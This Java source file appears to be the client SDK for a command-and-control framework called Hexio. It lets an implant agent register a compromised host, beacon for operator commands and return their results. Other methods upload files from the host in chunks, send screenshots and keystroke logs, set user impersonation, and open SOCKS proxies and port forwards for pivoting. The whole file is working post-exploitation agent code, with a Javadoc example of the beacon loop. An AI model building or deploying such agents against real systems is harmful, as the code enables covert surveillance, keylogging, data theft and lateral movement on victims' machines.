package io.hexio.sdk;

import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Hexio External Agent SDK for Java.
 *
 * <pre>{@code
 * HexioClient client = new HexioClient("http://10.0.0.1:9000", "my-passphrase");
 * RegisterRequest req = new RegisterRequest();
 * req.hostname = "WORKSTATION";
 * req.ip = "10.0.0.50";
 * req.user = "admin";
 * req.os = "Windows 10";
 * req.process = "agent.exe";
 * req.pid = 1234;
 * req.clientType = "my_agent";
 * req.sleepTime = 5;
 * RegisterResponse reg = client.register(req);
 *
 * while (true) {
 *     CheckinResponse checkin = client.checkin();
 *     for (Command cmd : checkin.commands) {
 *         client.commandResponse(cmd.id, cmd.command, "result");
 *     }
 *     Thread.sleep(5000);
 * }
 * }</pre>
 */
public class HexioClient {

    public final String baseUrl;
    public final String passphrase;
    public String token;
    public long agentId;

    private final HttpClient http;
    private static final ObjectMapper MAPPER = new ObjectMapper()
            .setSerializationInclusion(JsonInclude.Include.NON_NULL);

    public HexioClient(String baseUrl, String passphrase) {
        this(baseUrl, passphrase, HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(30))
                .build());
    }

    public HexioClient(String baseUrl, String passphrase, HttpClient http) {
        this.baseUrl = baseUrl.replaceAll("/+$", "");
        this.passphrase = passphrase;
        this.http = http;
    }

    // --- Transport ---

    private JsonNode request(String method, String path, Object body) {
        try {
            HttpRequest.Builder rb = HttpRequest.newBuilder()
                    .uri(URI.create(baseUrl + path))
                    .timeout(Duration.ofSeconds(30))
                    .header("HexioExternalAgentAuth", passphrase);

            if (token != null && !token.isEmpty()) {
                rb.header("HexioAgentToken", token);
            }

            HttpRequest.BodyPublisher publisher;
            if (body != null) {
                String json = MAPPER.writeValueAsString(body);
                publisher = HttpRequest.BodyPublishers.ofString(json);
                rb.header("Content-Type", "application/json");
            } else {
                publisher = HttpRequest.BodyPublishers.noBody();
            }
            rb.method(method, publisher);

            HttpResponse<String> resp = http.send(rb.build(), HttpResponse.BodyHandlers.ofString());
            String text = resp.body();

            if (resp.statusCode() >= 400) {
                String message = text;
                try {
                    JsonNode err = MAPPER.readTree(text);
                    if (err.hasNonNull("error")) {
                        message = err.get("error").asText(text);
                    }
                } catch (IOException ignore) {}
                throw new HexioApiException(resp.statusCode(), message);
            }

            if (text == null || text.isEmpty()) {
                return MAPPER.createObjectNode();
            }
            return MAPPER.readTree(text);
        } catch (HexioApiException e) {
            throw e;
        } catch (IOException | InterruptedException e) {
            if (e instanceof InterruptedException) Thread.currentThread().interrupt();
            throw new RuntimeException("request failed: " + e.getMessage(), e);
        }
    }

    private <T> T requestAs(String method, String path, Object body, Class<T> type) {
        JsonNode node = request(method, path, body);
        return MAPPER.convertValue(node, type);
    }

    // --- Registration ---

    public RegisterResponse register(RegisterRequest req) {
        RegisterResponse resp = requestAs("POST", "/register", req, RegisterResponse.class);
        this.token = resp.token;
        this.agentId = resp.agentId;
        return resp;
    }

    // --- Checkin / Sync ---

    public CheckinResponse checkin() {
        return requestAs("GET", "/agent/checkin", null, CheckinResponse.class);
    }

    /**
     * Performs a full batched POST /agent/sync. If {@code req} is null, posts no body
     * (which the server treats as a plain checkin and only returns queued commands
     * plus any staged files).
     */
    public SyncResponse sync(SyncRequest req) throws IOException {
        JsonNode node = request("POST", "/agent/sync", req);
        return MAPPER.convertValue(node, SyncResponse.class);
    }

    public JsonNode syncRaw(Object body) {
        return request("POST", "/agent/sync", body);
    }

    // --- Command Response ---

    public JsonNode commandResponse(long commandId, String command, String response) {
        Map<String, Object> body = new HashMap<>();
        body.put("command_id", commandId);
        body.put("command", command);
        body.put("response", response);
        return request("POST", "/agent/command/response", body);
    }

    // --- Downloads ---

    public DownloadInitResponse downloadInit(DownloadInitRequest req) {
        return requestAs("POST", "/agent/download/init", req, DownloadInitResponse.class);
    }

    public JsonNode downloadChunk(String downloadId, byte[] chunk) {
        Map<String, Object> body = new HashMap<>();
        body.put("download_id", downloadId);
        body.put("chunk_data", Base64.getEncoder().encodeToString(chunk));
        return request("POST", "/agent/download/chunk", body);
    }

    public JsonNode downloadCancel(String downloadId) {
        Map<String, Object> body = new HashMap<>();
        body.put("download_id", downloadId);
        return request("POST", "/agent/download/cancel", body);
    }

    public String downloadFile(String filePath, byte[] data, int chunkSize) {
        String name = filePath;
        int slash = Math.max(filePath.lastIndexOf('/'), filePath.lastIndexOf('\\'));
        if (slash >= 0) name = filePath.substring(slash + 1);

        int cs = Math.max(1, chunkSize);
        int total = (data.length + cs - 1) / cs;

        DownloadInitRequest init = new DownloadInitRequest();
        init.fileName = name;
        init.agentPath = filePath;
        init.fileSize = data.length;
        init.chunkSize = cs;
        init.totalChunks = total;

        DownloadInitResponse resp = downloadInit(init);
        for (int i = 0; i < total; i++) {
            int start = i * cs;
            int len = Math.min(cs, data.length - start);
            byte[] chunk = new byte[len];
            System.arraycopy(data, start, chunk, 0, len);
            downloadChunk(resp.downloadId, chunk);
        }
        return resp.downloadId;
    }

    // --- Screenshot / Keylog ---

    public JsonNode screenshot(String filename, byte[] imageData) {
        Map<String, Object> body = new HashMap<>();
        body.put("filename", filename);
        body.put("data", Base64.getEncoder().encodeToString(imageData));
        return request("POST", "/agent/screenshot", body);
    }

    public JsonNode keylog(String filename, String data) {
        Map<String, Object> body = new HashMap<>();
        body.put("filename", filename);
        body.put("data", data);
        return request("POST", "/agent/keylog", body);
    }

    // --- Impersonation ---

    public JsonNode setImpersonation(String user) {
        Map<String, Object> body = new HashMap<>();
        body.put("user", user);
        return request("POST", "/agent/impersonation", body);
    }

    public JsonNode clearImpersonation() {
        return setImpersonation("");
    }

    // --- Side Channel ---

    public JsonNode sidechannel(String channelId, String dataB64) {
        Map<String, Object> body = new HashMap<>();
        body.put("channel_id", channelId);
        body.put("data", dataB64);
        return request("POST", "/agent/sidechannel", body);
    }

    // --- File Requests ---

    public JsonNode requestFiles(FileRequest req) {
        return request("POST", "/agent/files/request", req);
    }

    // --- SOCKS ---

    public JsonNode socksOpen(Long port) {
        Map<String, Object> body = new HashMap<>();
        if (port != null) body.put("port", port);
        return request("POST", "/agent/socks/open", body);
    }

    public JsonNode socksClose() {
        return request("POST", "/agent/socks/close", new HashMap<String, Object>());
    }

    public JsonNode socksSync(Object data) {
        return request("POST", "/agent/socks/sync", data);
    }

    // --- Port Forwarding ---

    public JsonNode portfwdOpen(long port, String remoteHost, long remotePort) {
        Map<String, Object> body = new HashMap<>();
        body.put("port", port);
        body.put("remote_host", remoteHost);
        body.put("remote_port", remotePort);
        return request("POST", "/agent/portfwd/open", body);
    }

    public JsonNode portfwdClose(long port) {
        Map<String, Object> body = new HashMap<>();
        body.put("port", port);
        return request("POST", "/agent/portfwd/close", body);
    }

    public JsonNode portfwdSync(Object data) {
        return request("POST", "/agent/portfwd/sync", data);
    }
}
